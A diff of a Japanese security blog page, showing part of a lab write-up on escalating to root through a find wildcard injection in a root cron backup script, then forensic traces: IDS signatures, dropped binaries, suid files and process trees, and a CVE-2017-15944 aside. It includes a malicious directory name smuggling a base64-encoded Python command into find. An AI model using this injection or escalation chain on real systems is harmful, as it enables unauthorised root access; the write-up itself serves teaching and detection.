 大体のファイルシステムは、名前の最大長が 255 文字であるため、コードが長すぎると作成できません。</p>
-
 <p>255文字を超える恐れがあるなら、予め別のシェルスクリプトを作成し、injection時はそのスクリプトを呼ぶようにすればいいです。</p>
-
 <p>あとは 翌日 1 時の cron の実行を待つだけです！</p>
-
-<hr />
-
+<hr>
 <h4 id="翌日1時">～翌日1時～</h4>
-
 <p>1時になったので、ラッパーファイルの状態を見てみます。</p>
-
 
 
 <div class="box" >
@@ -1090,12 +898,9 @@ mkdir &quot;* -exec python -c exec('aW1wb3J0IG9zO29zLnN5c3RlbSgnY2hvd24gcm9vdCAv
   </figure>
 </div>
 
-
 <p>見事ラッパーファイルの所有者がrootになってsuidがついていますね。
 更新日時も1時になっています。</p>
-
 <p>早速アクセスします。</p>
-
 
 
 <div class="box" >
@@ -1107,38 +912,22 @@ mkdir &quot;* -exec python -c exec('aW1wb3J0IG9zO29zLnN5c3RlbSgnY2hvd24gcm9vdCAv
   </figure>
 </div>
 
-
 <p>画像の通り root 権限になっています。</p>
-
 <p><strong>権限昇格成功です💪</strong></p>
-
 <p>あとはmeterpreterを接続するなりしてなんでも好きなことができます。</p>
-
-<p><br/></p>
-
-<hr />
-
+<!-- raw HTML omitted -->
+<hr>
 <h1 id="攻撃の痕跡">攻撃の痕跡</h1>
-
 <h2 id="ids">IDS</h2>
-
-<p>WSOやmeterpreterの接続など、初期侵入の部分は検知してくれました。<br />
+<p>WSOやmeterpreterの接続など、初期侵入の部分は検知してくれました。<br>
 ただ、meterpreter接続後は全く検知しませんでした。</p>
-
 <p>入口対策、および初期侵入の検知時にいかに対応できるかが侵害発見のポイントになりそうです。</p>
-
 <p>検知シグネチャは以下のとおり。</p>
-
-<p><br/></p>
-
-<h4 id="et-attack-response-wso-webshell-activity-wso-title">ET ATTACK_RESPONSE WSO - WebShell Activity - WSO Title</h4>
-
+<!-- raw HTML omitted -->
+<h4 id="et-attack_response-wso---webshell-activity---wso-title">ET ATTACK_RESPONSE WSO - WebShell Activity - WSO Title</h4>
 <p>WSOの各操作のレスポンスで検知しました。</p>
-
 <h4 id="et-policy-executable-and-linking-format-elf-file-download">ET POLICY Executable and linking format (ELF) file download</h4>
-
 <p>meterpreter にスイッチするためにmeterpreter stageをダウンロードするので、その時のバイナリを検知しました。</p>
-
 
 
 <div class="box" >
@@ -1150,15 +939,10 @@ mkdir &quot;* -exec python -c exec('aW1wb3J0IG9zO29zLnN5c3RlbSgnY2hvd24gcm9vdCAv
   </figure>
 </div>
 
-
-<p><br/></p>
-
+<!-- raw HTML omitted -->
 <h3 id="ファイルシステム">ファイルシステム</h3>
-
 <p>攻撃者は、全てのアクションは最初に侵入したユーザの権限の範囲内でのみ行なえます。</p>
-
 <p>今回はwww-dataユーザだったので、以下のディレクトリに書き込みが可能でした。</p>
-
 <ul>
 <li>/tmp</li>
 <li>/var/tmp</li>
@@ -1166,36 +950,21 @@ mkdir &quot;* -exec python -c exec('aW1wb3J0IG9zO29zLnN5c3RlbSgnY2hvd24gcm9vdCAv
 <li>/var/run/apache2</li>
 <li>/run/apache2</li>
 </ul>
-
-<p>侵害調査には 各tmpディレクトリを洗い出すのはもはや常識ですが、思わぬところに書き込み権限があり、攻撃者がそれを利用している可能性もあります。<br />
+<p>侵害調査には 各tmpディレクトリを洗い出すのはもはや常識ですが、思わぬところに書き込み権限があり、攻撃者がそれを利用している可能性もあります。<br>
 なので /var/www/html など、tmpの他に侵害ユーザが書き込み可能なディレクトリも全て洗い出すべきですね。</p>
-
 <p>下記findコマンドでwww-dataが書き込み可能なディレクトリを調べられます。</p>
-
 <pre><code class="language-shell">find / \( -perm -002 -o -user www-data -o -group www-data \) -type d
 </code></pre>
-
-<p><br/>
-また、攻撃者は今回/tmp/.sessionを作業ディレクトリにしました。<br />
-ドットファイル/ドットディレクトリはlsコマンド単体では出てこないので注意。<br />
-(ls -aやfindなら出てくる）</p>
-
-<p><br/></p>
-
-<h4 id="tmp-bc">/tmp/bc</h4>
-
-<p>WSO のリバースコネクト用バイナリ。<br />
-WSOのリバースコネクトは、作成するファイル形式をCバイナリかperlスクリプトか選べます。<br />
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<h4 id="tmpbc">/tmp/bc</h4>
+<p>WSO のリバースコネクト用バイナリ。<br>
+WSOのリバースコネクトは、作成するファイル形式をCバイナリかperlスクリプトか選べます。<br>
 Cバイナリの場合は、常に/tmp/bc というパスでバイナリを作成します。</p>
-
-<p><br/></p>
-
-<h4 id="tmp-session-w">/tmp/.session/w</h4>
-
+<!-- raw HTML omitted -->
+<h4 id="tmpsessionw">/tmp/.session/w</h4>
 <p>権限昇格用バイナリ。suidがついているので大変わかりやすいです。</p>
-
 <p>find で suid が付与されているファイルを洗い出せば出てきます。</p>
-
 
 
 <div class="box" >
@@ -1207,26 +976,17 @@ Cバイナリの場合は、常に/tmp/bc というパスでバイナリを作�
   </figure>
 </div>
 
-
-<p>一つだけ/tmpに存在するのでバレバレですね。<br />
+<p>一つだけ/tmpに存在するのでバレバレですね。<br>
 攻撃者は/usr/bin/ や /bin/ にファイルを作成できないのでこんなことになるのです。</p>
-
-<p><br/></p>
-
-<h4 id="var-www-html-images-exec-python-c-exec-aw1-略-kq-decode-base64">/var/www/html/images/* -exec python -c exec(&lsquo;aW1(略)KQ==&rsquo;.decode(&lsquo;base64&rsquo;)) ;</h4>
-
-<p>もはやネタ。<br />
-攻撃者は何回も実行されないように一回実行されたら削除しますが、当然痕跡としては残ります。<br />
+<!-- raw HTML omitted -->
+<h4 id="varwwwhtmlimages--exec-python--c-execaw1略kqdecodebase64-">/var/www/html/images/* -exec python -c exec(&lsquo;aW1(略)KQ==&rsquo;.decode(&lsquo;base64&rsquo;)) ;</h4>
+<p>もはやネタ。<br>
+攻撃者は何回も実行されないように一回実行されたら削除しますが、当然痕跡としては残ります。<br>
 フォレンジック時、「-exec」を含むファイル/ディレクトリを探すといいかもしれません。</p>
-
-<p><br/></p>
-
+<!-- raw HTML omitted -->
 <h3 id="プロセス">プロセス</h3>
-
 <p>侵害調査時、万が一攻撃者が活動してて鉢合わせたらプロセスですぐにわかります。</p>
-
 <p>以下は「ps auxwf」の結果です。</p>
-
 
 
 <div class="box" >
@@ -1238,9 +998,7 @@ Cバイナリの場合は、常に/tmp/bc というパスでバイナリを作�
   </figure>
 </div>
 
-
 <p>以下の流れであることがひと目でわかりますね。</p>
-
 <ol>
 <li>WSOでリバースコネクト</li>
 <li>meterpreter の stager</li>
@@ -1248,43 +1006,27 @@ Cバイナリの場合は、常に/tmp/bc というパスでバイナリを作�
 <li>権限昇格用バイナリ ./w (root権限)</li>
 <li>./w が root 権限で bash を起動</li>
 </ol>
-
-<p><br/>
-攻撃者としては鉢合わせないように、常にnetstat(ss)やpsに目を光らせておく必要がありますね。</p>
-
-<hr />
-
-<h2 id="コラム-というか雑記">コラム（というか雑記）</h2>
-
+<!-- raw HTML omitted -->
+<hr>
+<h2 id="コラムというか雑記">コラム（というか雑記）</h2>
 <p>find に対する Wildcard Injection の解説はどこよりも詳しく書けたんじゃないかな・・・</p>
-
 <p>というのも、この脆弱性には縁があるのです。</p>
-
 <p>2017年にPaloAlto の NGFWである PAシリーズで、root 権限で RCE可能な脆弱性 (CVE-2017-15944) が見つかりました。</p>
-
 <blockquote>
 <p><a href="http://www.security-next.com/088709">http://www.security-next.com/088709</a></p>
 </blockquote>
-
 <p>そして、当時SOCアナリストだった私はこの脆弱性のPoCが公開される前に自分で検証してrootを取ることができました。
 そして検証の結果なかなかにやばい脆弱性ということがわかったので記事にしたのです。（記事はCVEでググってください）</p>
-
 <p>そのCVE-2017-15944 についてですが、これは今回と同じくログを定期バックアップするシェルスクリプトに脆弱性があり、
 同様に find コマンドの Wildcard Injection の脆弱性でした。</p>
-
 <blockquote>
 <p><a href="https://seclists.org/fulldisclosure/2017/Dec/38">https://seclists.org/fulldisclosure/2017/Dec/38</a></p>
 </blockquote>
-
 <p>この脆弱性を調査する過程で Wildcard Injectionを学んだのですが、当時は記事の速報性を重視したために攻撃の原理を書けず悔しい思いをしたので、ここでまとめてかくことにしました。</p>
-
 <p>これで成仏できます。😇</p>
-
-<hr />
-
+<hr>
 <p>今回はAD侵害までいけず、Linux環境の権限昇格のところまででした。
 次こそADにいきたいですが、フォワーディングだけで終わりそう</p>
-
 <p>以上。</p>
 
         
@@ -1407,27 +1149,6 @@ Cバイナリの場合は、常に/tmp/bc というパスでバイナリを作�
       
     
       
-  <link rel="stylesheet" type="text/css" href="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.0/cookieconsent.min.css" />
-  <script src="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.0/cookieconsent.min.js"></script>
-  <script>
-    window.addEventListener("load", function(){
-    window.cookieconsent.initialise({
-      "palette": {
-        "popup": {
-          "background": "#000"
-        },
-        "button": {
-          "background": "#f1d600"
-        }
-      },
-      "content": {
-        "message": "本Webサイトのセキュリティ情報は、サイバー空間の安心・安全な環境を確保する目的で公開しています。ここで知り得た情報は決して悪用しないでください。",
-        "dismiss": "OK",
-        "href": "/pages/about-disclosure-security-information/"
-      }
-    })});
-  </script>
-      
     
   
 
@@ -1474,7 +1195,7 @@ Cバイナリの場合は、常に/tmp/bc というパスでバイナリを作�
 
           &nbsp;&bull;&nbsp;&copy;
           
-            2019
+            2020
           
 
           
@@ -1484,7 +1205,7 @@ Cバイナリの場合は、常に/tmp/bc というパスでバイナリを作�
         </p>
         
         <p class="credits theme-by text-muted">
-          <a href="http://gohugo.io">Hugo v0.55.6</a> powered &nbsp;&bull;&nbsp; Theme by <a href="http://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a> adapted to <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a>
+          <a href="http://gohugo.io">Hugo v0.63.2</a> powered &nbsp;&bull;&nbsp; Theme by <a href="http://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a> adapted to <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a>
           
         </p>
 	<p class="credits theme-by text-muted">
